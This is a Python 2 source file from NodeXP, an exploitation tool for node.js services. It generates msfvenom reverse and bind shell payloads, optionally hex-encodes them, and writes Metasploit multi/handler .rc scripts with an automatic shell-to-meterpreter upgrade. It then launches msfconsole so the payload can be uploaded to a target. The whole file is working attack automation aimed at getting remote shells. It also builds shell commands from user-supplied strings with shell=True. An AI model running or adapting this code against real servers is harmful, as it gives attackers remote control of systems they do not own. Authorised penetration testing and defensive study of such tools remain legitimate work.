#!/usr/bin/python2.7	
# encoding: UTF-8

"""
This file is part of NodeXP, a detection & exploitation tool for 
node.js services (https://github.com/esmog/nodexp) created by 
Antonaropoulos Dimitrios (@esmog).
For more info about NodeXP see the 'README.md' file.
"""

import src.core.init.settings as settings
import src.core.init.payload_init as payload_init
import src.interfaces.options.prompt as prompt
import src.interfaces.options.verbosity as verbosity
import src.core.exploitation.options as options
import re
import os
import subprocess
import base64
from colorama import Fore, Back, Style, init
from os.path import expanduser
import socket

def initialize_payload_options(start):
	try:
		# If some/all variables are not defined
		message = Fore.YELLOW + '[<] Initialize exploitation variables.'
		verbosity.print_message(message,settings.print_info)

		# Reverse shell case
		if settings.lhost == 'None' and settings.msf_payload != settings.msf_payload_bind:
			message = Fore.RED + '[!] LHOST not defined!'
			verbosity.print_message(message,settings.print_info)
			settings.lhost = str(payload_init.get_input("[?] Please, set your local host ip.\n - ","LHOST"))

		# Bind shell case
		if settings.msf_payload == settings.msf_payload_bind:
			rhost = settings.pre_url.rsplit(":", 1)
			settings.prefix_rhost = rhost[0]
			rhost_without_http = rhost[0].split("/")
			settings.rhost = rhost_without_http[2]
			message = Fore.GREEN + "[!] Setting automatically remote host: 'RHOST' = " + settings.rhost
			verbosity.print_message(message, settings.print_info)

		if settings.lport == 'None':
			message = Fore.RED + '[!] LPORT not defined!'
			verbosity.print_message(message,settings.print_info)
			settings.lport = str(payload_init.get_input("[?] Please, set your local port.\n - ","LPORT"))
		else:
			input_answer = settings.lport
			settings.lport = payload_init.checkLPORT(input_answer)

		if settings.payload_path == 0:
			message = Fore.RED + '[!] PAYLOAD PATH not defined!'
			verbosity.print_message(message,settings.print_info)
			payload_path = payload_init.get_input("[?] Please, set the PAYLOAD PATH.\n - ","PAYLOAD PATH")
			settings.payload_path = '%s/nodejs_payload.js' %payload_path	
			settings.payload_path = re.sub(r"\/+", "/", settings.payload_path)
			print settings.payload_path
		else:
			input_answer = settings.payload_path
			payload_path = settings.payload_path
			settings.payload_path = '%s/nodejs_payload.js' %payload_path	
			settings.payload_path = re.sub(r"\/+", "/", settings.payload_path)
	
		if settings.rc_path == 0:
			message = Fore.RED + '[!] .RC SCRIPT PATH not defined!'
			verbosity.print_message(message,settings.print_info)
			rc_path = payload_init.get_input("[?] Please, set the .RC SCRIPT PATH.\n - ","RC SCRIPT PATH")
			settings.rc_path = '%s/nodejs_payload.js' %rc_path	
			settings.rc_path = re.sub(r"\/+", "/", settings.rc_path)
			print settings.rc_path
		else:
			input_answer = settings.rc_path
			rc_path = settings.rc_path
			settings.rc_path = '%s/nodejs_shell.rc' %rc_path
			settings.rc_path = re.sub(r"\/+", "/", settings.rc_path)

		if settings.encoding[0] == 'None':
			message = Fore.RED + '[!] ENCODING not defined!'
			verbosity.print_message(message,settings.print_info)
			while settings.encoding[0] == 'None':
				settings.encoding = prompt.yesOrNo("[?] Please, type a valid value for payload encoding.\n"+ Fore.YELLOW + "[i] Enter 'y' for 'yes' or 'n' for 'no'.\n" + Fore.WHITE + " - ",Fore.GREEN + "[i] Payload will be encoded..",Fore.GREEN + "[i] Payload will be unecoded")
		
		
		# End process
		message = Fore.GREEN + '[!] Exploitation variables successfully defined!\n' + Fore.YELLOW + '[>]'
		verbosity.print_message(message,settings.print_info)
		
		if start == True:			
			start_exploitation()

	except Exception as e:
		print(e)
		print(Fore.RED + "[!] ERROR: %s" %e)
		verbosity.error_info(e)
		
def start_exploitation():
	try:
		message = Fore.YELLOW + '\n[<] Generate exploitation files and run metasploit.'
		verbosity.print_message(message,settings.print_info)
		if settings.encoding[0] == 1:
			if settings.msf_payload == settings.msf_payload_reverse:
				proc = subprocess.Popen("msfvenom -p " + settings.msf_payload + " LHOST=" + settings.lhost + " LPORT=" + str(settings.lport) + " -e " + settings.encode + " -o " + settings.payload_path + " >/dev/null 2>&1 ", shell=True).wait()
			else:
				proc = subprocess.Popen("msfvenom -p " + settings.msf_payload + " LPORT=" + str(settings.lport) + " -e " + settings.encode + " -o " + settings.payload_path + " >/dev/null 2>&1 ", shell=True).wait()
			with open (settings.payload_path, "r+") as content_file:
				data = content_file.readlines()
				data = ''.join(data)
				data_string = str(data)
				data_string = data_string.lstrip()
				#data_string = base64.b64encode(data_string)
				data_string = data_string.encode('hex')
				file_data = content_file.read()
				content_file.seek(0,0)
				content_file.write(settings.append_top + data_string + settings.append_bottom)
				settings.reverse_shell_payload = settings.append_top + data_string + settings.append_bottom
		
		# Generate payload without encoding		
		### UNENCODED CASE
		else:
			if settings.msf_payload == settings.msf_payload_reverse:
				proc = subprocess.Popen("msfvenom -p " + settings.msf_payload + " LHOST=" + settings.lhost + " LPORT=" + str(settings.lport) + " -o " + settings.payload_path + " >/dev/null 2>&1 ", shell=True).wait()
			else:
				proc = subprocess.Popen("msfvenom -p " + settings.msf_payload + " LPORT=" + str(settings.lport) + " -o " + settings.payload_path + " >/dev/null 2>&1 ", shell=True).wait()
			with open (settings.payload_path, "r+") as content_file:
				data = content_file.readlines()
				data = ''.join(data)
				data_string = str(data)
				data_string = data_string.lstrip()
				content_file.seek(0,0)
				payload = content_file.write(data)
				settings.reverse_shell_payload = data_string

		message = Fore.GREEN + "[i] Successfully generated payload file! [" + settings.payload_path + "]"
		verbosity.print_message(message, settings.print_info)
		
		# Remove and regenerate spool file
		settings.spool_file = settings.rc_path +".output.txt"
		# Check if spool file already exists
		if os.path.exists(settings.spool_file) == True:
			try:
				os.remove(settings.spool_file)
				create_spool_file = open(settings.spool_file,"w+")
				message = Fore.GREEN + "[i] Successfully generated metasploit log file (spool file) [%s]"%settings.spool_file
				verbosity.print_message(message, settings.print_info)
			except Exception as e:
				print(Fore.RED + "[!] ERROR: %s" %e)
				verbosity.error_info(e)	
		else:
			try:
				create_spool_file = open(settings.spool_file,"w+")
				message = Fore.GREEN + "[i] Successfully generated metasploit log file (spool file) [%s]"%settings.spool_file
				verbosity.print_message(message, settings.print_info)
			except Exception as e:
				print(Fore.RED + "[!] ERROR: %s" %e)
				verbosity.error_info(e)
		# .RC SCRIPT generation
		with open(settings.rc_path, 'w+') as filewrite:
			if settings.msf_payload == settings.msf_payload_reverse:
				filewrite.write("use exploit/multi/handler\n"
							  	"set payload " + settings.msf_payload + "\n"
							  	"set lhost "+ settings.lhost + "\n"
							  	"set lport " + str(settings.lport) + "\n"
					  			"set ExitOnSession true \n"
					  			"set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter' \n"
					  			"spool " + settings.spool_file +"\n"
							  	"exploit -j -z\n\n")
			elif settings.msf_payload == settings.msf_payload_bind:
				filewrite.write("use exploit/multi/handler\n"
								"set payload " + settings.msf_payload + "\n"
								"set rhost " + settings.rhost + "\n"
								"set lport " + str(settings.lport) + "\n"
								"set ExitOnSession true \n"
								#"set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter' \n"
								"spool " + settings.spool_file + "\n"
								"exploit -j -z\n\n")
			else:
				filewrite.write("use exploit/multi/handler\n"
								"set payload " + settings.msf_payload + "\n"
								"set lhost " + settings.lhost + "\n"
								"set lport " + str(settings.lport) + "\n"
								"set ExitOnSession true \n"
								#"set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter' \n"
								"spool " + settings.spool_file + "\n"
								"exploit -j -z\n\n")

		message = Fore.GREEN + "[i] Successfully generated .rc script! [%s]"%settings.rc_path
		verbosity.print_message(message, settings.print_info)
		
	    	# >/dev/null 2>&1 -> sends the output to garbage, 
		# /dev/null is a black hole where any data sent will be discarded. Standar output (1) and standar error output (2) will be send there.
		message = Style.DIM + "[-] Opening metasploit console..."	   	
		verbosity.print_message(message, settings.print_info)
	    	msfconsole = os.system("xterm -e 'bash -c \"msfconsole -r %s; exec bash\"' &> /dev/null 2>&1"%settings.rc_path)

		message = Fore.GREEN + "[i] Successfully loaded metasploit!"
		verbosity.print_message(message, settings.print_info)

		if settings.msf_payload != settings.msf_payload_bind:
			exploitation_options_msg = (Fore.WHITE + "[?] Please, select options above:\n (1) Upload the payload at '%s:%s' (current metasploit session); type: '1'\n (2) If you want to exit; type: '2'\n - " %(settings.lhost,settings.lport))
			exploitation_options_invalid_input_msg = Fore.RED + 'Sorry, invalid input. Please, try again.'
			next_step = options.exploitation_options(exploitation_options_msg,exploitation_options_invalid_input_msg)
		else:
			exploitation_options_msg = (Fore.WHITE + "[?] Please, select options above:\n (1) Upload the payload at '%s' (current metasploit session); type: '1'\n (2) If you want to exit; type: '2'\n - " % (settings.pre_url))
			exploitation_options_invalid_input_msg = Fore.RED + 'Sorry, invalid input. Please, try again.'
			next_step = options.exploitation_options(exploitation_options_msg, exploitation_options_invalid_input_msg)

		if next_step == 2: start_exploitation()
		elif next_step == 3: initialize_payload_options()

	except Exception as e:
		print(Fore.RED + "[!] ERROR: %s" %e)
		verbosity.error_info(e)

